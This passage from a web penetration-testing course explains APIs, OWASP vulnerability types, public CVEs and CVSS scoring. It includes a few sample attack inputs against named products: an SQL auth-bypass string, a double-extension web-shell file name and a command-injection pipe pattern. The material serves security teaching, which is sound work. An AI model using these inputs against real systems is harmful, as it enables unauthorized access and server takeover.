- **GET**: `/search.php?item=apples`
- **POST**:
```
  POST /search.php HTTP/1.1
  ...SNIP...

  item=apples
```

Each page can accept and handle a variety of input types through these query parameters.

---

### Web APIs

APIs specify how components talk to each other. In web applications, **Web APIs** are accessed using HTTP, and they allow front end components to perform operations like authentication or retrieving data from external services.

Example APIs: weather APIs, Twitter API, Google Maps API, etc.

---

### SOAP

**SOAP** (Simple Object Access Protocol) APIs send data in XML format. They are structured and typically used in enterprise-level applications.

Example SOAP request:

```xml
<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://www.example.com/soap/soap/"
               soap:encodingStyle="http://www.w3.org/soap/soap-encoding">
  <soap:Header>
  </soap:Header>
  <soap:Body>
    <soap:Fault>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
```

- Great for sharing **stateful** structured data.
- Not beginner-friendly due to verbosity.

---

### REST

**REST** (Representational State Transfer) APIs use clear URL paths like `/search/users/1` and return data in **JSON**.

They are modular, lightweight, and very popular in modern apps. Common response formats: JSON, XML, form-urlencoded, etc.

Example REST response:

```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

#### REST Methods

- `GET`: Retrieve data
- `POST`: Create data (non-idempotent)
- `PUT`: Create or replace data (idempotent)
- `DELETE`: Remove data

---

## Common Web Vulnerabilities

If we were performing a penetration test on an internally developed web application or did not find any public exploits for a public web application, we may manually identify several vulnerabilities. We may also uncover vulnerabilities caused by misconfigurations, even in publicly available web applications, since these types of vulnerabilities are not caused by the public version of the web application but by a misconfiguration made by the developers. The below examples are some of the most common vulnerability types for web applications, part of [OWASP Top 10](https://owasp.org/www-project-top-ten/) vulnerabilities for web applications.

---

### Broken Authentication/Access Control

**Broken Authentication** and **Broken Access Control** are among the most common and most dangerous vulnerabilities for web applications.

- **Broken Authentication** refers to vulnerabilities that allow attackers to bypass authentication functions. For example, this may allow an attacker to login without having a valid set of credentials or allow a normal user to become an administrator without having the privileges to do so.

- **Broken Access Control** refers to vulnerabilities that allow attackers to access pages and features they should not have access to. For example, a normal user gaining access to the admin panel.

For example, *College Management System 1.2* has a simple **Auth Bypass** vulnerability that allows us to login without having an account, by inputting the following for the email field:

```
' or 0=0 #
```

…and using any password with it.

---

### Malicious File Upload

Another common way to gain control over web applications is through uploading malicious scripts. If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a **PHP** script), which will allow us to execute commands on the remote server.

Even though this is a basic vulnerability, many developers are not aware of these threats, so they do not properly check and validate uploaded files. Furthermore, some developers do perform checks and attempt to validate uploaded files, but these checks can often be bypassed, which would still allow us to upload malicious scripts.

For example, the WordPress Plugin **Responsive Thumbnail Slider 1.0** can be exploited to upload any arbitrary file, including malicious scripts, by uploading a file with a double extension (i.e.:

```
shell.php.jpg
``` 

). There's even a **Metasploit Module** that allows us to exploit this vulnerability easily.

---

### Command Injection

Many web applications execute local Operating System commands to perform certain processes. For example, a web application may install a plugin of our choosing by executing an OS command that downloads that plugin, using the plugin name provided. If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command (i.e., as the plugin name), which allows them to directly execute commands on the back end server and gain control over it. This type of vulnerability is called [command injection](https://owasp.org/www-community/attacks/Command_Injection).

This vulnerability is widespread, as developers may not properly sanitize user input or use weak tests to do so, allowing attackers to bypass any checks or filtering put in place and execute their commands.

For example, the WordPress Plugin **Plainview Activity Monitor 20161228** has a vulnerability that allows attackers to inject their command in the `ip` value, by simply adding:

```
| COMMAND...
```

…after the `ip` value.

---

### SQL Injection (SQLi)

Another very common vulnerability in web applications is a **SQL Injection** vulnerability. Similarly to a Command Injection vulnerability, this vulnerability may occur when the web application executes a SQL query, including a value taken from user-supplied input.

For example, in the *database* section, we saw an example of how a web application would use user-input to search within a certain table, with the following line of code:

```php
$query = "select * from users where name like '%$searchInput%'";
```

If the user input is not properly filtered and validated (as is the case with **Command Injections**), we may execute another SQL query alongside this query, which may eventually allow us to take control over the database and its hosting server.

For example, the same previous *College Management System 1.2* suffers from a SQL injection **vulnerability**, in which we can execute another **SQL** query that always returns `true`, meaning we successfully authenticated, which allows us to log in to the application. We can use the same vulnerability to retrieve data from the database or even gain control over the hosting server.

---

We will see these vulnerabilities again and again in our learning journey and real-world assessments. It is important to become familiar with each of these as even a basic understanding of each will give us a leg up in any information security realm. Later modules will cover each of these vulnerabilities in-depth.

---

## Public Vulnerabilities

The most critical back end component vulnerabilities are those that can be attacked externally and can be leveraged to take control over the back end server without needing local access to that server (i.e., external penetration testing). These vulnerabilities are usually caused by coding mistakes made during the development of a web application's back-end components. So, there is a wide variety of vulnerability types in this area, ranging from basic vulnerabilities that can be exploited with relative ease to sophisticated vulnerabilities requiring deep knowledge of the entire web application.

---

### Public CVE

As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE ([Common Vulnerabilities and Exposures](https://cve.mitre.org)) record and score.

Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications.

> Tip: The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g., in `version.php` page), and then check the same page on our target web application to confirm.

Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like [Exploit DB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com). The following example shows a search for WordPress public exploits in **Rapid7 DB**.

---

### Common Vulnerability Scoring System (CVSS)

The [Common Vulnerability Scoring System (CVSS)](https://www.first.org/cvss/) is an open-source industry standard for assessing the severity of security vulnerabilities. This scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems' vulnerabilities. This helps with the prioritization of resources and the response to a given threat.

CVSS scores are based on a formula that uses several metrics: **Base**, **Temporal**, and **Environmental**. When calculating the severity of a vulnerability using CVSS, the **Base** metrics produce a score ranging from 0 to 10, modified by applying **Temporal** and **Environmental** metrics. The [National Vulnerability Database (NVD)](https://nvd.nist.gov/) provides CVSS scores for almost all known, publicly disclosed vulnerabilities.

At this time, the NVD only provides **Base** scores based upon a given vulnerability's inherent characteristics. The current scoring systems in place are CVSS v2 and CVSS v3. There are several differences between the v2 and v3 systems, namely changes to the **Base** and **Environmental** groups to account for additional metrics.

| CVSS V2.0 Ratings | Base Score Range |
|-------------------|------------------|
| Low               | 0.0–3.9          |
| Medium            | 4.0–6.9          |
| High              | 7.0–10.0         |

| CVSS V3.0 Ratings | Base Score Range |
|-------------------|------------------|
| None              | 0.0              |
| Low               | 0.1–3.9          |
| Medium            | 4.0–6.9          |
| High              | 7.0–8.9          |
| Critical          | 9.0–10.0         |

The NVD does not factor in **Temporal** and **Environmental** metrics because the former can change over time due to external events. The latter is a customized metric based on the potential impact of the vulnerability on a given organization. The NVD provides a [CVSS v2 calculator](https://nvd.nist.gov/vuln-metrics/cvss) and a [CVSS v3 calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator) that organizations can use to factor additional risk from **Temporal** and **Environmental** data unique to them.

These calculators are very interactive and can be used to fine-tune the CVSS score to your environment. We can move over each metric to read more about it and determine exactly how it applies to our organization.

---

### Back-end Server Vulnerabilities

Like public vulnerabilities for web applications, we should also consider looking for vulnerabilities for other back end components, like the back end server or the webserver.

The most critical vulnerabilities for back-end components are found in web servers, as they are publicly accessible over the **TCP** protocol. An example of a well-known web server vulnerability is the **Shell-Shock**, which affected Apache web servers released during and before 2014 and utilized **HTTP** requests to gain remote control over the back-end server.

As for vulnerabilities in the back-end server or the database, they are usually utilized after gaining local access to the back-end server or back-end network, which may be gained through **external** vulnerabilities or during internal penetration testing. They are usually used to gain high privileged access on the back-end server or the back-end network or gain control over other servers within the same network.

Although not directly exploitable externally, these vulnerabilities are still critical and need to be patched to protect the entire web application from being compromised.